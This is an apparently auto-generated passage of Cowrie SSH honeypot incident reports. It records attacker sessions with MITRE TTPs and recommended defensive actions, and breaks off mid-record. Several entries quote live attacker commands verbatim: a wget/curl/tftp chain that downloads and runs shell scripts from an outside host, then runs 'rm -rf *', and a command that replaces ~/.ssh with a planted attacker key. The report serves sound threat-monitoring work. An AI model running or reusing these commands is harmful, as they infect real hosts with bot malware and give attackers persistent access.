| **Source IP** | `172.160.227[.]37` |
| **First Seen** | 2026-09-19 19:06 |
| **Last Seen** | 2026-09-19 19:06 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-19 19:06:25` | `cowrie.session.connect` |
| `2026-09-19 19:06:25` | `cowrie.client.version` |
| `2026-09-19 19:06:25` | `cowrie.client.kex` |
| `2026-09-19 19:06:25` | `cowrie.login.success` |
| `2026-09-19 19:06:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.160.227[.]37` to AbuseIPDB if not already reported
- [ ] Block `172.160.227[.]37` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6c3f5351bd88

| Field | Detail |
|---|---|
| **Source IP** | `172.160.227[.]37` |
| **First Seen** | 2026-09-19 19:06 |
| **Last Seen** | 2026-09-19 19:06 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-19 19:06:25` | `cowrie.session.connect` |
| `2026-09-19 19:06:25` | `cowrie.client.version` |
| `2026-09-19 19:06:25` | `cowrie.client.kex` |
| `2026-09-19 19:06:26` | `cowrie.login.success` |
| `2026-09-19 19:06:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.160.227[.]37` to AbuseIPDB if not already reported
- [ ] Block `172.160.227[.]37` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0392e3227093

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]218` |
| **First Seen** | 2026-09-19 19:10 |
| **Last Seen** | 2026-09-19 19:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-19 19:10:34` | `cowrie.session.connect` |
| `2026-09-19 19:10:34` | `cowrie.client.version` |
| `2026-09-19 19:10:34` | `cowrie.client.kex` |
| `2026-09-19 19:10:34` | `cowrie.login.success` |
| `2026-09-19 19:10:35` | `cowrie.session.params` |
| `2026-09-19 19:10:35` | `cowrie.command.input` |
| `2026-09-19 19:10:35` | `cowrie.log.closed` |
| `2026-09-19 19:10:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]218` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c2cbdda97e3d

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]218` |
| **First Seen** | 2026-09-19 19:12 |
| **Last Seen** | 2026-09-19 19:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-19 19:12:09` | `cowrie.session.connect` |
| `2026-09-19 19:12:09` | `cowrie.client.version` |
| `2026-09-19 19:12:09` | `cowrie.client.kex` |
| `2026-09-19 19:12:10` | `cowrie.login.success` |
| `2026-09-19 19:12:10` | `cowrie.session.params` |
| `2026-09-19 19:12:10` | `cowrie.command.input` |
| `2026-09-19 19:12:10` | `cowrie.log.closed` |
| `2026-09-19 19:12:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]218` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

```
⚠️  MALWARE ANALYSIS — HIGH SEVERITY SAMPLE DETECTED
   File  : 07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656  (ELF Binary (Linux executable))
   SHA256: 07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aa...
   Score : 86/100  |  VT: 40/75
   ↳ Download via wget: wget
   ↳ Download via curl: curl
   ↳ Execution from /tmp: /tmp/bot
   ↳ chmod +x (make executable): chmod +x
```

### 🔴 HIGH · IR-5eeca339244b

| Field | Detail |
|---|---|
| **Source IP** | `23.94.206[.]233` |
| **First Seen** | 2026-09-19 19:13 |
| **Last Seen** | 2026-09-19 19:13 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh, cd /tmp || cd /run || cd /mnt || cd /root || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh; busybox wget hxxp://213.232.114[.]14/handshakebins.sh; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh; chmod 777 handshakebins.sh; sh handshakebins.sh; tftp 213.232.114[.]14 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 213.232.114[.]14; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf handshakebins.sh tftp1.sh tftp2.sh; rm -rf *` |
| **Download Attempts** | hxxp://213.232.114[.]14/handshakebins.sh, hxxp://213.232.114[.]14/handshakebins.sh, hxxp://213.232.114[.]14/handshakebins.sh |
| **Malware Analysis** | 07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656 (HIGH) |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-19 19:13:35` | `cowrie.session.connect` |
| `2026-09-19 19:13:35` | `cowrie.login.success` |
| `2026-09-19 19:13:36` | `cowrie.session.params` |
| `2026-09-19 19:13:37` | `cowrie.command.input` |
| `2026-09-19 19:13:38` | `cowrie.command.input` |
| `2026-09-19 19:13:38` | `cowrie.session.file_download` |
| `2026-09-19 19:13:38` | `cowrie.session.file_download` |
| `2026-09-19 19:13:38` | `cowrie.session.file_download` |
| `2026-09-19 19:13:38` | `cowrie.session.file_download` |
| `2026-09-19 19:13:38` | `cowrie.session.file_download.failed` |
| `2026-09-19 19:13:38` | `cowrie.session.file_download` |
| `2026-09-19 19:13:39` | `cowrie.session.file_download` |
| `2026-09-19 19:13:52` | `cowrie.log.closed` |
| `2026-09-19 19:13:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `23.94.206[.]233` to AbuseIPDB if not already reported
- [ ] Block `23.94.206[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Review VT report: hxxps://www.virustotal.com/gui/file/07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d6bce3de822c

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]218` |
| **First Seen** | 2026-09-19 19:13 |
| **Last Seen** | 2026-09-19 19:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-19 19:13:40` | `cowrie.session.connect` |
| `2026-09-19 19:13:40` | `cowrie.client.version` |
| `2026-09-19 19:13:40` | `cowrie.client.kex` |
| `2026-09-19 19:13:40` | `cowrie.login.success` |
| `2026-09-19 19:13:41` | `cowrie.session.params` |
| `2026-09-19 19:13:41` | `cowrie.command.input` |
| `2026-09-19 19:13:41` | `cowrie.log.closed` |
| `2026-09-19 19:13:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]218` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6af4c2951471

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]218` |
| **First Seen** | 2026-09-19 19:15 |
| **Last Seen** | 2026-09-19 19:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-19 19:15:06` | `cowrie.session.connect` |
| `2026-09-19 19:15:06` | `cowrie.client.version` |
| `2026-09-19 19:15:06` | `cowrie.client.kex` |
| `2026-09-19 19:15:07` | `cowrie.login.success` |
| `2026-09-19 19:15:07` | `cowrie.session.params` |
| `2026-09-19 19:15:07` | `cowrie.command.input` |
| `2026-09-19 19:15:07` | `cowrie.log.closed` |
| `2026-09-19 19:15:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]218` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5bc06c30fdd5

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]69` |
| **First Seen** | 2026-09-19 19:15 |
| **Last Seen** | 2026-09-19 19:16 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh, cd /tmp || cd /run || cd /mnt || cd /root || cd /; wget hxxp://213.232.114[.]14/nokillbins/handshakebins.sh; busybox wget hxxp://213.232.114[.]14/nokillbins/handshakebins.sh; curl -o handshakebins.sh hxxp://213.232.114[.]14/nokillbins/handshakebins.sh; chmod 777 handshakebins.sh; sh handshakebins.sh; tftp 213.232.114[.]14 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 213.232.114[.]14; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf handshakebins.sh tftp1.sh tftp2.sh; rm -rf *` |
| **Download Attempts** | hxxp://213.232.114[.]14/nokillbins/handshakebins.sh, hxxp://213.232.114[.]14/nokillbins/handshakebins.sh, hxxp://213.232.114[.]14/nokillbins/handshakebins.sh |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-19 19:15:45` | `cowrie.session.connect` |
| `2026-09-19 19:15:45` | `cowrie.login.success` |
| `2026-09-19 19:15:46` | `cowrie.session.params` |
| `2026-09-19 19:15:47` | `cowrie.command.input` |
| `2026-09-19 19:15:47` | `cowrie.command.input` |
| `2026-09-19 19:15:48` | `cowrie.session.file_download` |
| `2026-09-19 19:15:48` | `cowrie.session.file_download` |
| `2026-09-19 19:15:48` | `cowrie.session.file_download` |
| `2026-09-19 19:15:48` | `cowrie.session.file_download` |
| `2026-09-19 19:15:48` | `cowrie.session.file_download.failed` |
| `2026-09-19 19:15:49` | `cowrie.session.file_download` |
| `2026-09-19 19:15:49` | `cowrie.session.file_download` |
| `2026-09-19 19:16:02` | `cowrie.log.closed` |
| `2026-09-19 19:16:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]69` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]69` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b8262d97c983

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]218` |
| **First Seen** | 2026-09-19 19:17 |
| **Last Seen** | 2026-09-19 19:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-19 19:17:09` | `cowrie.session.connect` |
| `2026-09-19 19:17:09` | `cowrie.client.version` |
| `2026-09-19 19:17:09` | `cowrie.client.kex` |
| `2026-09-19 19:17:10` | `cowrie.login.success` |
| `2026-09-19 19:17:10` | `cowrie.session.params` |
| `2026-09-19 19:17:10` | `cowrie.command.input` |
| `2026-09-19 19:17:10` | `cowrie.log.closed` |
| `2026-09-19 19:17:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]218` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0ad583cfe992

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]218` |
| **First Seen** | 2026-09-19 19:19 |
| **Last Seen** | 2026-09-19 19:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-19 19:19:09` | `cowrie.session.connect` |
| `2026-09-19 19:19:09` | `cowrie.client.version` |
| `2026-09-19 19:19:09` | `cowrie.client.kex` |
| `2026-09-19 19:19:10` | `cowrie.login.success` |
| `2026-09-19 19:19:10` | `cowrie.session.params` |
| `2026-09-19 19:19:10` | `cowrie.command.input` |
| `2026-09-19 19:19:10` | `cowrie.log.closed` |
| `2026-09-19 19:19:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]218` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-36e3be7261c2

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]218` |
| **First Seen** | 2026-09-19 19:21 |
| **Last Seen** | 2026-09-19 19:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-19 19:21:04` | `cowrie.session.connect` |
| `2026-09-19 19:21:04` | `cowrie.client.version` |
| `2026-09-19 19:21:04` | `cowrie.client.kex` |
| `2026-09-19 19:21:04` | `cowrie.login.success` |
| `2026-09-19 19:21:05` | `cowrie.session.params` |
| `2026-09-19 19:21:05` | `cowrie.command.input` |
| `2026-09-19 19:21:05` | `cowrie.log.closed` |
| `2026-09-19 19:21:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]218` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9e8d0f10630f

| Field | Detail |
|---|---|
| **Source IP** | `182.253.156[.]184` |
| **First Seen** | 2026-09-19 19:21 |
| **Last Seen** | 2026-09-19 19:21 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-19 19:21:34` | `cowrie.session.connect` |
| `2026-09-19 19:21:34` | `cowrie.client.version` |
| `2026-09-19 19:21:34` | `cowrie.client.kex` |
| `2026-09-19 19:21:35` | `cowrie.login.success` |
| `2026-09-19 19:21:36` | `cowrie.session.params` |
| `2026-09-19 19:21:36` | `cowrie.command.input` |
| `2026-09-19 19:21:36` | `cowrie.command.failed` |
| `2026-09-19 19:21:37` | `cowrie.log.closed` |
| `2026-09-19 19:21:38` | `cowrie.session.params` |
| `2026-09-19 19:21:38` | `cowrie.command.input` |
| `2026-09-19 19:21:38` | `cowrie.session.file_download` |
| `2026-09-19 19:21:38` | `cowrie.log.closed` |
| `2026-09-19 19:21:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.253.156[.]184` to AbuseIPDB if not already reported
- [ ] Block `182.253.156[.]184` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-145ec6cf25c2

| Field | Detail |
|---|---|
| **Source IP** | `182.253.156[.]184` |
| **First Seen** | 2026-09-19 19:21 |
| **Last Seen** | 2026-09-19 19:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-19 19:21:38` | `cowrie.session.connect` |
| `2026-09-19 19:21:38` | `cowrie.client.version` |
| `2026-09-19 19:21:38` | `cowrie.client.kex` |
| `2026-09-19 19:21:39` | `cowrie.login.success` |
| `2026-09-19 19:21:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.253.156[.]184` to AbuseIPDB if not already reported
- [ ] Block `182.253.156[.]184` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-52be26828c78

| Field | Detail |
|---|---|
| **Source IP** | `182.253.156[.]184` |
| **First Seen** | 2026-09-19 19:21 |
| **Last Seen** | 2026-09-19 19:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-19 19:21:40` | `cowrie.session.connect` |
| `2026-09-19 19:21:40` | `cowrie.client.version` |
| `2026-09-19 19:21:40` | `cowrie.client.kex` |
| `2026-09-19 19:21:41` | `cowrie.login.success` |
| `2026-09-19 19:21:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.253.156[.]184` to AbuseIPDB if not already reported
- [ ] Block `182.253.156[.]184` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c4e5be04c430

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]218` |
| **First Seen** | 2026-09-19 19:24 |
| **Last Seen** | 2026-09-19 19:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-19 19:24:05` | `cowrie.session.connect` |
| `2026-09-19 19:24:05` | `cowrie.client.version` |
| `2026-09-19 19:24:05` | `cowrie.client.kex` |
| `2026-09-19 19:24:05` | `cowrie.login.success` |
| `2026-09-19 19:24:06` | `cowrie.session.params` |
| `2026-09-19 19:24:06` | `cowrie.command.input` |
| `2026-09-19 19:24:06` | `cowrie.log.closed` |
| `2026-09-19 19:24:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]218` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c0fc7948a86e

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]218` |
| **First Seen** | 2026-09-19 19:26 |
| **Last Seen** | 2026-09-19 19:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-19 19:26:17` | `cowrie.session.connect` |
| `2026-09-19 19:26:17` | `cowrie.client.version` |
| `2026-09-19 19:26:17` | `cowrie.client.kex` |
| `2026-09-19 19:26:17` | `cowrie.login.success` |
| `2026-09-19 19:26:18` | `cowrie.session.params` |
| `2026-09-19 19:26:18` | `cowrie.command.input` |
| `2026-09-19 19:26:18` | `cowrie.log.closed` |
| `2026-09-19 19:26:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]218` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e577cbb7d3e0

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]218` |
| **First Seen** | 2026-09-19 19:28 |
| **Last Seen** | 2026-09-19 19:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-19 19:28:30` | `cowrie.session.connect` |
| `2026-09-19 19:28:30` | `cowrie.client.version` |
| `2026-09-19 19:28:31` | `cowrie.client.kex` |
| `2026-09-19 19:28:31` | `cowrie.login.success` |
| `2026-09-19 19:28:31` | `cowrie.session.params` |
| `2026-09-19 19:28:31` | `cowrie.command.input` |
| `2026-09-19 19:28:32` | `cowrie.log.closed` |
| `2026-09-19 19:28:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]218` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-32eef517dc9b

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-09-19 19:28 |
| **Last Seen** | 2026-09-19 19:28 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-19 19:28:58` | `cowrie.session.connect` |
| `2026-09-19 19:28:58` | `cowrie.client.version` |
| `2026-09-19 19:28:58` | `cowrie.client.kex` |
| `2026-09-19 19:28:58` | `cowrie.login.success` |
| `2026-09-19 19:28:58` | `cowrie.direct-tcpip.request` |
| `2026-09-19 19:28:58` | `cowrie.direct-tcpip.data` |
| `2026-09-19 19:28:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d7c7768860df

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]218` |
| **First Seen** | 2026-09-19 19:30 |
| **Last Seen** | 2026-09-19 19:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-19 19:30:47` | `cowrie.session.connect` |
| `2026-09-19 19:30:47` | `cowrie.client.version` |
| `2026-09-19 19:30:47` | `cowrie.client.kex` |
| `2026-09-19 19:30:47` | `cowrie.login.success` |
| `2026-09-19 19:30:48` | `cowrie.session.params` |
| `2026-09-19 19:30:48` | `cowrie.command.input` |
| `2026-09-19 19:30:48` | `cowrie.log.closed` |
| `2026-09-19 19:30:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]218` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6fd57c5a9f39

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]218` |
| **First Seen** | 2026-09-19 19:32 |
| **Last Seen** | 2026-09-19 19:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-19 19:32:57` | `cowrie.session.connect` |
| `2026-09-19 19:32:57` | `cowrie.client.version` |
| `2026-09-19 19:32:57` | `cowrie.client.kex` |
| `2026-09-19 19:32:58` | `cowrie.login.success` |
| `2026-09-19 19:32:58` | `cowrie.session.params` |
| `2026-09-19 19:32:58` | `cowrie.command.input` |
| `2026-09-19 19:32:58` | `cowrie.log.closed` |
| `2026-09-19 19:32:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]218` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-53f061e864bc

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]218` |
| **First Seen** | 2026-09-19 19:34 |
| **Last Seen** | 2026-09-19 19:35 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-19 19:34:59` | `cowrie.session.connect` |
| `2026-09-19 19:34:59` | `cowrie.client.version` |
| `2026-09-19 19:34:59` | `cowrie.client.kex` |
| `2026-09-19 19:35:00` | `cowrie.login.success` |
| `2026-09-19 19:35:01` | `cowrie.session.params` |
| `2026-09-19 19:35:01` | `cowrie.command.input` |
| `2026-09-19 19:35:02` | `cowrie.log.closed` |
| `2026-09-19 19:35:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]218` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-90425880c5fa

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]218` |
| **First Seen** | 2026-09-19 19:37 |
| **Last Seen** | 2026-09-19 19:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-19 19:37:02` | `cowrie.session.connect` |
| `2026-09-19 19:37:02` | `cowrie.client.version` |
| `2026-09-19 19:37:02` | `cowrie.client.kex` |
| `2026-09-19 19:37:02` | `cowrie.login.success` |
| `2026-09-19 19:37:03` | `cowrie.session.params` |
| `2026-09-19 19:37:03` | `cowrie.command.input` |
| `2026-09-19 19:37:03` | `cowrie.log.closed` |
| `2026-09-19 19:37:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]218` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9f90553fc4a4

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]218` |
| **First Seen** | 2026-09-19 19:38 |
| **Last Seen** | 2026-09-19 19:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-19 19:38:39` | `cowrie.session.connect` |
| `2026-09-19 19:38:39` | `cowrie.client.version` |
| `2026-09-19 19:38:39` | `cowrie.client.kex` |
